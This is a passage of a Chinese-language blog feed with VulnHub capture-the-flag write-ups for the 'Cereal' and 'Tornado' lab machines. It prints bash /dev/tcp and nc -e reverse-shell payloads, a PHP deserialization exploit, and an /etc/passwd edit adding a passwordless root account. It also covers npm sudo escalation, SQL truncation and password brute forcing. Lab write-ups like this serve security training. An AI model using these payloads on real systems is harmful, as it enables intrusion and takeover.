data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODMvYWRtaW4v\">http://192.168.31.83/admin/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1316.png\" width=\"550\" alt=\"Image\">\n<p>一个后台的登陆地址，可以尝试弱口令，万能密码，sql 注入、burp 代理数据修改返回包、爆破密码、xss 攻击等。简单的试了试之后发现并没有什么很严重的弱点，就把现在的目标转到其他的网站上。</p>\n<h3 id=\"子域名收集\"><a class=\"markdownIt-Anchor\" href=\"#子域名收集\">#</a> 子域名收集</h3>\n<p>收集另一个开放的 web 站点的信息：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODM6NDQ0NDE=\">http://192.168.31.83:44441</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1317.png\" width=\"500\" alt=\"Image\">\n<p>收集这个站点的目录并没有什么有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1318.png\" width=\"620\" alt=\"Image\">\n<p>收集 44441 端口上是否存在一些子域名<br>\n <code>gobuster vhost -u http://cereal.ctf:44441 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1319.png\" width=\"620\" alt=\"Image\">\n<p>收集到了子域名 secure.cereal.ctf:44441</p>\n<p>修改本地 hosts 文件，改变 DNS 解析指向为靶机 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1320.png\" width=\"520\" alt=\"Image\">\n<p>经过上述的信息收集，我们能得到的可以利用的漏洞很有可能就是在后来发现的这个子域名上。</p>\n<h3 id=\"继续信息收集\"><a class=\"markdownIt-Anchor\" href=\"#继续信息收集\">#</a> 继续信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQx\">http://secure.cereal.ctf:44441</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1321.png\" width=\"520\" alt=\"Image\">\n<p>发现了命令执行，但是输入；&amp;| 都没有起作用后，截取数据包，看数据包中的内容是些什么</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1322.png\" width=\"700\" alt=\"Image\">\n<p>可以选在 burp 自带的 url 解码，也可以在线 url 解码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1323.png\" width=\"640\" alt=\"Image\">\n<p>如图依次点击可将原先的编码进行 url 解码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1324.png\" width=\"590\" alt=\"Image\">\n<p>这是一个 php 反序列化漏洞，但是如果找不到源码的话很难去利用这个漏洞，寻找这个子域名下是否有一些目录存在</p>\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1325.png\" width=\"660\" alt=\"Image\">\n<p>扫的比较慢，而且大半天也没有什么发现</p>\n<h3 id=\"ffuf模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#ffuf模糊测试\">#</a> ffuf 模糊测试</h3>\n<p>换个字典换个工具跑  <code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1326.png\" width=\"660\" alt=\"Image\">\n<p>找到了一个 back_en 的备份文件夹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1327.png\" width=\"660\" alt=\"Image\">\n<p>打开之后发现是没有权限去进入这个目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1328.png\" width=\"580\" alt=\"Image\">\n<p>但是这个目录是确实存在的，继续向下扫描看能否找到敏感文件<br>\n <code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/back_en/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1329.png\" width=\"660\" alt=\"Image\">\n<p>找到一个备份文件 index.php.bak, 打开之后发现了源码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1330.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"php反序列化\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化\">#</a> php 反序列化</h3>\n<p>看源代码可以规范代码的格式，阅读此处的 php 代码查看反序列化造成的原因<br>\n <code>view-source:http://secure.cereal.ctf:44441/back_en/index.php.bak</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1331.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>isValid 默认为 False，从浏览器发送请求时，会进入 if，并检查该值是否为 IP 地址。<br>\n尝试注入命令时，它拒绝了输入，如果我们在请求中发送值 True，则根本不会执行 if 块。<br>\n会直接调用 ping 方法。通过 shell_exec 函数执行命令。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">需要先实例化、在进行序列化和url编码：</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class pingTest &#123;</span><br><span class=\"line\">  public $ipAddress = &quot;;bash -i &gt;&amp; /dev/tcp/192.168.31.18/4444 0&gt;&amp;1 &quot;;</span><br><span class=\"line\">  public $isValid = True;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">obj = NEW pingTest;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">serilaze= serialize(<span class=\"variable\">$obj</span>);</span></span><br><span class=\"line\">echo urlencode($serilaze);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>可以在线 php 执行，输出内容如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1332.png\" width=\"520\" alt=\"Image\">\n<p>也可以用 php 去执行下面的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1333.png\" width=\"660\" alt=\"Image\">\n<p>得到漏洞利用代码：<br>\n <code>O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A45%3A%22%3Bbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.31.15%2F4444+0%3E%261+%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3B%7D</code></p>\n<p>将 payload 发送到 burp 中，用 burp 发送此恶意数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1334.png\" width=\"620\" alt=\"Image\">\n<p>同时在 kali 上监听端口，得到了反弹的 shell，并进行终端优化</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1335.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"ln-软连接\"><a class=\"markdownIt-Anchor\" href=\"#ln-软连接\">#</a> ln 软连接</h3>\n<p>上 pspy 监控看看，看到了一个脚本被定期执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1336.png\" width=\"590\" alt=\"Image\">\n<blockquote>\n<p>chown 是用来改变用户和用户组权限的，这个脚本可以更改位于用户 rocky 的主目录中的文件 public_html 内容的所有者，当前用户 apache 组，apache 用户可以访问目录中的文件</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1337.png\" width=\"400\" alt=\"Image\">\n<p>尝试直接修改 /etc/passwd 中的用户，生成一个无密码的是 root 权限的账户<br>\n <code>ln -s /etc/passwd /home/rocky/public_html/etcpasswd</code> <br>\n <code>ln -s</code>  后，对添加软连接的地方做出改变则原文件也发生了改变</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1338.png\" width=\"500\" alt=\"Image\">\n<p>等待定时任务被执行后，/etc/passwd 就会因为我们设置的软连接<br>\n /home/rocky/public_html/etcpasswd 的权限被修改为 rocky:apache，而<br>\n /etc/passwd 的权限也被改变为了 apache 可操作的文件</p>\n<h3 id=\"root密码置空\"><a class=\"markdownIt-Anchor\" href=\"#root密码置空\">#</a> root 密码置空</h3>\n<blockquote>\n<p><code>echo &quot;mhq::0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</code> <br>\n 删除了 x，也就是删除 root 用户的密码身份验证<br>\n通过 su mhq 可以直接无密码升级到 root 权限</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1339.png\" width=\"550\" alt=\"Image\">\n<p>可以检验一下，现在我们 root 密码仍然未知，但是 mhq 的用户密码 x 不存在</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1340.png\" width=\"410\" alt=\"Image\">\n<p>-&gt; 可以直接通过一个普通用户提权到 root</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/145%20TORANDO/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/145%20TORANDO/",
            "title": "VULNHUB 45 TORANDO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtdG9ybmFkbyw2Mzkv\">https://www.vulnhub.com/entry/ia-tornado,639/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyNDI2\">https://blog.csdn.net/hljzzj/article/details/122952426</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGlyYWswL2FydGljbGVzLzE2MjA3NTgwLmh0bWw=\">https://www.cnblogs.com/hirak0/articles/16207580.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 TORANDO：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1341.png\" width=\"520\" alt=\"Image\">\n<p>2 ）粗略的识别一下该 ip 上开放了哪些端口<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1342.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.83 靶机开放端口 22,80</p>\n<p>3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<p><code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.183 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1344.png\" width=\"440\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 http：可对 web 进行渗透测试收集信息</p>\n</blockquote>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODMv\">http://192.168.0.183/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1345.png\" width=\"590\" alt=\"Image\">\n<p>一个 apache 界面，看了一下框架，查看 robots 协议，.git 文件，审查源代码后均没有什么发现，开始扫描目录<br>\n <code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url http://192.168.0.183</code></p>\n<p>common.txt 字典稍微小一点，扫的速度比较快，是个不错的字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1346.png\" width=\"660\" alt=\"Image\">\n<p>没有扫描到有价值的信息，换个大字典在扫一下<br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.183/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1348.png\" width=\"660\" alt=\"Image\">\n<p>扫到一个目录 bluesky，访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODMvYmx1ZXNreQ==\">http://192.168.0.183/bluesky</span> 发现了一个新的站点，是一个新的 web 界面，可对此进行扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1350.png\" width=\"620\" alt=\"Image\">\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url http://192.168.0.183/bluesky</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1352.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"wfuzz-测试参数\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-测试参数\">#</a> wfuzz 测试参数</h3>\n<p>看到了注册登陆的功能，可以在 signup.php 下注册</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1354.png\" width=\"520\" alt=\"Image\">\n<p>然后在 login.php 下登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1356.png\" width=\"520\" alt=\"Image\">\n<p>登陆成功之后，dashboard 页面显示出了当前的用户名</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1357.png\" width=\"620\" alt=\"Image\">\n<p>在 port 界面看到了有一个 LFI 漏洞的提示</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1358.png\" width=\"620\" alt=\"Image\">\n<p>用 wfuzz 测试一下是否有参数<br>\n <code>wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -u http://192.168.0.183/bluesky/port.php?FUZZ=xxx</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1359.png\" width=\"660\" alt=\"Image\">\n<p>发现回显全是 302 ，过滤之后在看看，判断是否有参数<br>\n <code>wfuzz -c -u http://192.168.31.53/bluesky/port.php?FUZZ=xxx) -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | grep -v 302</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1360.png\" width=\"660\" alt=\"Image\">\n<p>审查源代码，看看有没有什么提示，发现了一个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1361.png\" width=\"520\" alt=\"Image\">\n<p>但是访问不到这个文件，可能是做了一些变异</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1362.png\" width=\"380\" alt=\"Image\">\n<h3 id=\"脑力测试解谜\"><a class=\"markdownIt-Anchor\" href=\"#脑力测试解谜\">#</a> 脑力测试解谜</h3>\n<p>依次尝试怎么能访问到这个 imp.txt，最后在如下链接中找到了 imp.txt</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjgvfnRvcmFuZG8vaW1wLnR4dA==\">http://192.168.0.168/~torando/imp.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1363.png\" width=\"440\" alt=\"Image\">\n<p>最后还有一个 contact.php，点开看看说是一些功能出于安全因素已经修复</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1364.png\" width=\"620\" alt=\"Image\">\n<p>整理一下收集到的重要的信息，有一份 imp.txt 可能是一些邮箱地址，还有一个注册一个登陆的地方，需要通过这几个条件做突破</p>\n<p>将 imp.txt 下载到本地</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1365.png\" width=\"520\" alt=\"Image\">\n<p>依次用这几个用户尝试注册登陆，第一个用户是新用户，可进入其管理中心</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1366.png\" width=\"470\" alt=\"Image\">\n<p>第二个也是一个未注册的新用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1367.png\" width=\"470\" alt=\"Image\">\n<p>直到用第三个用户注册的时候，发现了输入的用户名的长度被限制了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1368.png\" width=\"450\" alt=\"Image\">\n<p>修改源代码的长度限制，注册此用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1369.png\" width=\"450\" alt=\"Image\">\n<p>注册后发现也是一个新用户，可以进入其管理中心，想必这几个用户大部分都是未注册的用户，少部分是一些敏感用户，直接用 burp 批量注册发现有两个用户是注册过的一个是 admin@torando，一个是 jacob@torando</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1370.png\" width=\"450\" alt=\"Image\">\n<p>这两个用户是已经存在的用户，考虑爆破密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1371.png\" width=\"450\" alt=\"Image\">\n<h3 id=\"burp批量注册\"><a class=\"markdownIt-Anchor\" href=\"#burp批量注册\">#</a> burp 批量注册</h3>\n<p>数据拦截到 burp 中，选择 Cluster bomb 模式，对其进行爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1372.png\" width=\"520\" alt=\"Image\">\n<p>uname 参数就设置为两个已经存在的用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1373.png\" width=\"420\" alt=\"Image\">\n<p>密码就选用常用来做 web 目录扫描的 directory-list-2.3-meduim.txt</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1374.png\" width=\"420\" alt=\"Image\">\n<p>爆破了一段时间之后，出现了结果，爆出来了 admin 用户的两个密码，是的两个密码，很奇怪，为什么会有两个密码？</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1375.png\" width=\"660\" alt=\"Image\">\n<p>选取一个密码进入 admin 的管理中心看看，没有什么发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1376.png\" width=\"520\" alt=\"Image\">\n<p>最后的线索指向了一个已经注册的用户 jacob@torando，还有在页面前端做了 13 的长度限制，以及 admin 用户有两个密码。</p>\n<h3 id=\"sql截断攻击\"><a class=\"markdownIt-Anchor\" href=\"#sql截断攻击\">#</a> sql 截断攻击</h3>\n<blockquote>\n<p>sql 截断攻击：<br>\n当数据库由于长度限制而截断用户输入时，就会发生 SQL 截断漏洞。攻击者可以收集关键字段 (例如用户名) 长度的信息，并利用这些信息获得未经授权的访问。<br>\n改变用户名的输入框的输入限制，并开始给 jacob@tornado 用户再次申请一个密码。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1377.png\" width=\"400\" alt=\"Image\">\n<p>注册成功之后，用 jacob@tornado 登陆后发现是可以的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1378.png\" width=\"520\" alt=\"Image\">\n<p>在这个用户的 contact.php 界面找到了一个可以交互的界面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1379.png\" width=\"520\" alt=\"Image\">\n<p>输入内容后，在页面中有回显，左下角显示出来了 id</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1380.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"无回显rce\"><a class=\"markdownIt-Anchor\" href=\"#无回显rce\">#</a> 无回显 RCE</h3>\n<p>既然有输入有回显，就很有可能是 RCE 漏洞，输入 id’;id, 但是回显依然是本身，可能不是单纯的 linux 的 echo‘id’命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1381.png\" width=\"520\" alt=\"Image\">\n<p>不知道命令是否执行了，用命令注入无回显的方法试试，先用 dnslog 测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1383.png\" width=\"520\" alt=\"Image\">\n<p>但是 dnslog 没有任何回显，可能命令执行了，但是服务器没有 curl 命令也会出现这样的情况，还可以用抓包的方式判断此命令是否执行。</p>\n<h3 id=\"tcpdump抓包\"><a class=\"markdownIt-Anchor\" href=\"#tcpdump抓包\">#</a> tcpdump 抓包</h3>\n<p>在 kali 上用 tcpdump 抓包，监听 eth0 网卡，以及靶机 ip<br>\n <code>sudo tcpdump -i eth0 host 192.168.0.183</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1384.png\" width=\"570\" alt=\"Image\">\n<p>此接口处用来 ping kali 机器，注意一定要搞成发送固定的数据包，不然 ping 没法中断下来，导致重启靶机才能解决  <code>ping -c 4 192.168.0.168</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1385.png\" width=\"560\" alt=\"Image\">\n<blockquote>\n<p>在 ping 之后，上述 tcpdump 就会抓取到网卡的数据，证明这里的命令最终会被服务器执行，就可以在这里构造 payload 反弹 shell。</p>\n</blockquote>\n<p>反弹 shell，接受会话，美化终端<br>\n <code>nc 192.168.0.168 4444 -e /bin/bash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1386.png\" width=\"660\" alt=\"Image\">\n<p>收集服务器信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1387.png\" width=\"630\" alt=\"Image\">\n<p>发现服务器有 root、catchme、tornado 三个有 bash 的用户，并且 www-data 可以免密调用 catchme 的 npm 命令执行</p>\n<h3 id=\"sudonpm提权\"><a class=\"markdownIt-Anchor\" href=\"#sudonpm提权\">#</a> sudo (npm) 提权</h3>\n<p>在 GTFobins 上找到了思路，写 payload 进行提权需要两个文件，一个 package.json,<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbC1mZzFoeWouc2g=\"> 一个 shell.sh</span>，用 chmod 使其可执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi package.json</span><br><span class=\"line\">&#123; &quot;name&quot;: &quot;shell&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;shell&quot;: &quot;./shell.sh&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; &#125;</span><br><span class=\"line\">echo &quot;/bin/bash&quot; &gt;shell.sh</span><br><span class=\"line\">chmod +x shell.sh</span><br><span class=\"line\">sudo -u catchme npm run shell</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1388.png\" width=\"620\" alt=\"Image\">\n<p>或者可以直接浓缩为一句话的 linux 命令，直接提权至 catchme 用户</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /tmp ; echo &#x27; &#123; &quot;name&quot;: &quot;shell&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;:</span><br><span class=\"line\">&quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;shell&quot;: &quot;./shell.sh&quot; &#125;, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; &#125;</span><br><span class=\"line\">&#x27; &gt;package.json ; echo &quot;/bin/bash&quot; &gt;shell.sh ;chmod +x shell.sh ; sudo -u catchme</span><br><span class=\"line\">npm run shell</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1389.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"凯撒解密脚本\"><a class=\"markdownIt-Anchor\" href=\"#凯撒解密脚本\">#</a> 凯撒解密脚本</h3>\n<p>在用户目录下找到了一个加密的英文字符串，看到 trrwnqc 之后感觉很像是一个英文字符移位之后的显示，猜测是采用了凯撒加密。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1390.png\" width=\"340\" alt=\"Image\">\n<p>网上找一个可以解密恺撒解密的脚本放在本地</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\">alphabet = string.ascii_lowercase</span><br><span class=\"line\">encrypted = &quot;hcjqnnsotrrwnqc&quot;</span><br><span class=\"line\">enc_len = len(encrypted)</span><br><span class=\"line\">for i in range(25):</span><br><span class=\"line\">\t  plain_text = &quot;&quot;</span><br><span class=\"line\">\tfor c in encrypted:</span><br><span class=\"line\">\t\tif c.islower():</span><br><span class=\"line\">\t\t\tc_unicode = ord(c)</span><br><span class=\"line\">\t\t\tc_index = ord(c) - ord(&quot;a&quot;)</span><br><span class=\"line\">\t\t\tnew_index = (c_index - i) % 26</span><br><span class=\"line\">\t\t\tnew_unicode = new_index + ord(&quot;a&quot;)</span><br><span class=\"line\">\t\t\tnew_character = chr(new_unicode)</span><br><span class=\"line\">\t\t\tplain_text = plain_text + new_character</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tplain_text += c</span><br><span class=\"line\">\t\t\tprint(f&quot;ID:&#123;i&#125; : &#123;plain_text&#125;&quot;)</span><br></pre></td></tr></table></figure>\n<p>此脚本的作用就是依次计算加密字符串偏移 1 - 26 后的解密值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1391.png\" width=\"400\" alt=\"Image\">\n<p>运行脚本之后得到了如下字符串，其中最可疑的是 idkrootpussword</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1392.png\" width=\"400\" alt=\"Image\">\n<p>看样子像是 root 的密码，但是试了一下，不能凭借此密码登陆到 root</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1393.png\" width=\"320\" alt=\"Image\">\n<p>既然这个密码不是最终的密码，就写一些变体如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1394.png\" width=\"440\" alt=\"Image\">\n<p>用 hydra 尝试一一破解，最后得到了真实的 root 密码<br>\n <code>hydra -l root -P secret.txt ssh://192.168.0.183 -f -t 64 -I -vV</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1395.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 切换到了 root 用户成功，拿到了 root 权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1396.png\" width=\"330\" alt=\"Image\">\n<h3 id=\"tcpdump抓包命令\"><a class=\"markdownIt-Anchor\" href=\"#tcpdump抓包命令\">#</a> tcpdump 抓包命令</h3>\n<blockquote>\n<p>TCPDump 可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供 and、or、not 等逻辑语句来帮助你去掉无用的信息。他的功能与 wireshark 的功能相同，是命令行版本的抓包工具。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按网卡过滤：</span> </span><br><span class=\"line\">sudo tcpdump -i eth0</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-tt ： 在每列倾倒资料上显示未经格式化的时间戳记； sudo tcpdump -i eth0 -tt</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-n ：不把主机的网络地址转换成名字；</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -n</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-S ：用绝对而非相对数值列出 TCP 关联数；</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -S</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-vv ：更详细显示指令执行过程；</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -vv</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-w &lt;数据包文件&gt; ：把数据包数据写入指定的文件：</span> </span><br><span class=\"line\">sudo tcpdump -i eth0 -w output.pcap</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1397.png\" width=\"660\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-r &lt;数据包文件&gt; ：从指定的文件读取数据包数据；</span> </span><br><span class=\"line\">sudo tcpdump -r 